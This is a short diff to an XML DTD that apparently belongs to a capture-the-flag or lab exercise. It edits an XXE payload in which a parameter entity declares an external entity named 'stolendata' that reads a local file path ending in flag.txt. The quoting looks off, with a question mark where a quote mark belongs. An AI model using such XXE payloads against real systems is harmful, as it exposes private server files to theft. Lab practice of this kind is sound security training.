@@ -4,7 +4,7 @@
 
     <!ELEMENT demo ANY >
 
-    <!ENTITY % extentity "<!ENTITY stolendata SYSTEM ?file:///home/ubuntu/xxe2/flag.txt'>">
+    <!ENTITY % extentity "<!ENTITY stolendata SYSTEM ?file://home/ubuntu/xxe2/flag.txt'>">
 
     %extentity;
 
